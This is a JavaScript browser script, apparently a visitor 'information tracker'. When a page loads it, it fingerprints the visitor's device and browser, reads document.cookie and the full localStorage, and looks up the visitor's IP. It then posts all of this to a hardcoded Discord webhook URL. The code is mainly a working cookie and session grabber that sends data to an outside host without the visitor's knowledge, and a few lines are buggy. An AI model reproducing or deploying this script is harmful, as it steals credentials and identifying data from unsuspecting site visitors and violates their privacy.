const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";

function getUserInfo() {
  const canvas = document.createElement("canvas");
  const webgl = canvas.getContext("webgl");
  const debugInfo = webgl.getExtension("WEBGL_debug_renderer_info");

  return {
    userAgent: navigator.userAgent,
    locale: navigator.language,
    platform: navigator.platform,
    plugins: Array.from(navigator.plugins).map((plugin) => plugin.name),
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timezoneOffset: new Date().getTimezoneOffset(),
    webGL: webgl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
    onlineStatus: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    engine: navigator.productSub,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    javaEnabled: navigator.javaEnabled(),
    dataCookiesEnabled: navigator.cookieEnabled,
    dataCookies1: document.cookie,
    dataCookies2: decodeURIComponent(document.cookie.split(";")),
    dataStorage: localStorage,
    sizeScreenW: window.screen.width,
    sizeScreenH: window.screen.height,
    sizeDocW: document.width,
    sizeDocH: document.height,
    sizeInW: window.innerWidth,
    sizeInH: window.innerHeight,
    sizeAvailW: window.screen.availWidth,
    sizeAvailH: window.screen.availHeight,
    scrColorDepth: window.screen.colorDepth,
    scrPixelDepth: window.screen.pixelDepth,
    cpuClass: navigator.cpuClass,
    deviceMemory: navigator.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    networkConnection: navigator.connection
      ? navigator.connection.effectiveType
      : "unknown",
    rtcPeerConnection: !!window.RTCPeerConnection,
    sessionStorage: !!window.sessionStorage,
    localStorage: !!window.localStorage,
    indexedDB: !!window.indexedDB,
    openDatabase: !!window.openDatabase,
    touchSupport: "ontouchstart" in window,
    adBlock: !window.canRunAds,
    cookies: navigator.cookieEnabled,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    battery: navigator.getBattery ? navigator.getBattery() : "unknown",
    hasLiedLanguages: navigator.languages
      ? navigator.languages[0] != navigator.language
      : false,
    hasLiedResolution:
      window.screen.width < window.screen.availWidth ||
      window.screen.height < window.screen.availHeight,
    hasLiedOs:
      navigator.userAgent.toLowerCase().indexOf("windows nt 10.0") != -1 &&
      navigator.userAgent.indexOf("Windows NT 10.0") != -1,
    hasLiedBrowser:
      navigator.userAgent.indexOf("Firefox") != -1 &&
      navigator.userAgent.indexOf("Chrome") != -1,
    oscpu: navigator.oscpu,
    product: navigator.product,
    appCodeName: navigator.appCodeName,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    buildID: navigator.buildID,
    devicePixelRatio: window.devicePixelRatio,
    oscpu: navigator.oscpu,
    vendor: navigator.vendor,
    languages: navigator.languages,
    serviceWorker: navigator.serviceWorker ? true : false,
    permissions: navigator.permissions ? true : false,
    storage: navigator.storage ? true : false,
    credentials: navigator.credentials ? true : false,
    mediaDevices: navigator.mediaDevices ? true : false,
    geolocation: navigator.geolocation ? true : false,
    connection: navigator.connection ? true : false,
    mediaSession: navigator.mediaSession ? true : false,
    mimeTypes: navigator.mimeTypes
      ? Array.from(navigator.mimeTypes).map((m) => m.type)
      : [],
    userAgentData: navigator.userAgentData
      ? navigator.userAgentData.brands.map((b) => b.brand + " " + b.version)
      : [],
  };
}

// Fetch the user's IP
fetch(SHODAN_IP_API_URL)
  .then((response) => response.text)
  .then((data) => {
    const IP = data;

    const userInfo = getUserInfo();

    const fields = Object.keys(userInfo).map((key) => {
      return {
        name: key,
        value: userInfo[key] || "N/A",
        inline: true,
      };
    });

    const payload = {
      content: `User Information for IP: ${IP}`,
      embeds: [
        {
          title: "User Information",
          fields: fields,
          color: 3447003,
          footer: {
            text: "User Information Tracker",
          },
        },
      ],
    };

    // Send the IP to the Discord webhook
    fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
  });
